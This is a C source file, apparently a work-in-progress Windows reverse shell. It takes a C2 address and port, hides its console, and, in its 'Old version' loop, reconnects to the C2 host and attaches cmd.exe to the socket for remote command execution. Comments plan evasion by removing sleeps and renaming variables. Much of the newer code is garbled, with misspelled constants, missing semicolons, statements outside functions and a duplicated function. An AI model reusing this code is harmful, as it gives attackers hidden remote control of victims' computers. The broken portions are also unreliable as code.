#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib") // Winsock library


#include <windows.h>
#include <ws2tcpip.h>
#define DEFAULT_BUFLEN 1024

// Make this C not cpp

//https://niiconsulting.com/checkmate/2018/11/malware-on-steroids-part-1-simple-cmd-reverse-shell/
//https://packetstormsecurity.com/files/167699/C-Language-Reverse-Shell-Generator.html
//https://github.com/izenynn/c-reverse-shell/blob/main/windows.c
// https://www.binarytides.com/winsock-socket-programming-tutorial/
// https://cplusplus.com/reference/cstring/strcoll/

// Address Port Shell
int main(int argc, char *argvp[])	
{
    	if (argc == 4) {
        	int port  = atoi(argv[2]); //Converting port in Char datatype to Integer format
		if (port <= 65535 && (strcoll(argv[3], "cmd") == 0) || (strcoll(argv[3], "powershell") == 0)) {
		FreeConsole(); // Windows detach process from console - 
        	RunShell(argv[1], port, argv[3]);
		}
    	}	
	else {
		exit(0);
	}
	return 0;
}

// Remove sleep
// change variable names


if ((s = socket(AF_INET, SOCK_STEAM, 0)) == INVALID_SOCKET)
{
	// Safe print socket no avaliable
}


void RunShell(char* C2Server, int C2Port, char* Shell) 
{	
	WSADATA wsaVersion;
	struct sockaddr_in server;
	server.sin_addr.s_addr = inet_addr(C2Server);
	server.sin_family = AF_INET;
	server.sin_port = htons(C2Port);
	int recv_size
	char *message, server_reply[]; // Set a size 
 
	// Initialise WinSock Library
	if (WSAStartup(MAKEWORD(2,2),&wsaVersion) != 0)
	{
		//PRINT ("Failed. Error Code : %d",WSAGetLastError());
		return 1;
	}

	socket = socket(AF_INET, SOCK_STREAM, IPOROTO_TCP);
	(connect(s , (struct sockaddr *)&server , sizeof(server)) < 0)==
	
	send_size = send(socket, messagePtr, strlen(messagePtr), 0); 
	recv_size = recv(socket, server_replyPtr, replyBuffer, 0);
		
	// Connect back or close
	// Start process - argv[3] -> shell (powershell or cmd)
	Process[] = Shell 
	// exit if "<shellname>-exit\n" //\r?  
}


// Old version
void RunShell(char* C2Server, int C2Port, char* Shell) {
    while(true) {
        Sleep(5000);    // 1000 = One Second

        //Connecting to Proxy/ProxyIP/C2Host
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
		// Close socket and unload windsock libarary
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
		
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}
